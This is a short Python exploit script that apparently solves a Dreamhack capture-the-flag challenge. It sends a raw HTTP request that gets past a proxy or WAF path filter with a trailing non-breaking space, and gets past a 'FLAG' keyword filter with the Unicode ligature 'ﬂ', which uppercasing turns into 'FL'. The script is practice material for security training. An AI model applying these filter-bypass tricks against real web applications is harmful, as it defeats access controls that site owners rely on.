import socket

host = 'host3.dreamhack.games'
port = 16631

# https://hacktricks.wiki/en/pentesting-web/proxy-waf-protections-bypass.html
path = b'/shop\xa0'

# https://ind2x.github.io/posts/javascript_toLowerCase()_toUpperCase()_normalize_logic/
# [64258] ﬂ (%EF%AC%82).toUpperCase() => FL (%46%4c)


body = b'leg=\xef\xac\x82AG'

request = (
    b'POST ' + path + b' HTTP/1.1\r\n'
    b'Host: ' + host.encode() + b'\r\n'
    b'Content-Type: application/x-www-form-urlencoded\r\n'
    b'Content-Length: ' + str(len(body)).encode() + b'\r\n'
    b'Connection: close\r\n'
    b'\r\n'
    + body
)

s = socket.socket()
s.connect((host, port))
s.sendall(request)

res = b""
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    res += chunk

s.close()
print(res.decode('utf-8', errors='replace'))
